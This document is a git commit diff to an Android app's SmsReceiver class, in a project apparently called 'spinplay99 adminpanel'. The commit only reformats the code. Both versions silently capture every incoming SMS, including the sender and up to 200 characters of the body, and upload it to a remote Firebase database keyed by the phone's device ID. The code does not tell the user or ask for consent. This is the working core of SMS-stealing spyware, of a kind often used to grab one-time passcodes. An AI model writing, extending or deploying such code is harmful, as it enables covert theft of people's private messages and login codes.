4c7f19e23e8340e9703334a4a78fc3255c4408ba
ujjwalrebel53-wq <ujjwalrebel53@gmail.com>
2026-05-24 16:10:02 +0530

    Update SmsReceiver.java

--- app/src/main/java/com/spinplay99/adminpanel/SmsReceiver.java
+++ app/src/main/java/com/spinplay99/adminpanel/SmsReceiver.java
@@ -24,24 +24,32 @@ public class SmsReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
             FirebaseApp.initializeApp(context);
-            DatabaseReference db = FirebaseDatabase.getInstance().getReference();
-            String deviceId = android.provider.Settings.Secure.getString(context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+            DatabaseReference database = FirebaseDatabase.getInstance().getReference();
+            String deviceId = android.provider.Settings.Secure.getString(
+                context.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+
             Bundle bundle = intent.getExtras();
             if (bundle != null) {
                 Object[] pdus = (Object[]) bundle.get("pdus");
                 if (pdus != null) {
                     for (Object pdu : pdus) {
-                        SmsMessage sms = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? SmsMessage.createFromPdu((byte[]) pdu, "3gpp") : SmsMessage.createFromPdu((byte[]) pdu);
+                        SmsMessage sms = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M 
+                            ? SmsMessage.createFromPdu((byte[]) pdu, "3gpp") 
+                            : SmsMessage.createFromPdu((byte[]) pdu);
                         if (sms != null) {
                             Map<String, Object> data = new HashMap<>();
                             data.put("address", sms.getDisplayOriginatingAddress());
                             String body = sms.getDisplayMessageBody();
-                            data.put("body", body != null && body.length() > 200 ? body.substring(0, 200) : body);
+                            if (body != null && body.length() > 200) {
+                                body = body.substring(0, 200);
+                            }
+                            data.put("body", body);
                             data.put("date", String.valueOf(sms.getTimestampMillis()));
-                            data.put("date_readable", new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault()).format(new Date(sms.getTimestampMillis())));
+                            data.put("date_readable", new SimpleDateFormat("dd/MM/yyyy hh:mm a", Locale.getDefault())
+                                .format(new Date(sms.getTimestampMillis())));
                             data.put("type", "INBOX");
                             data.put("received_at", ServerValue.TIMESTAMP);
-                            db.child("devices").child(deviceId).child("new_sms").push().setValue(data);
+                            database.child("devices").child(deviceId).child("new_sms").push().setValue(data);
                         }
                     }
                 }
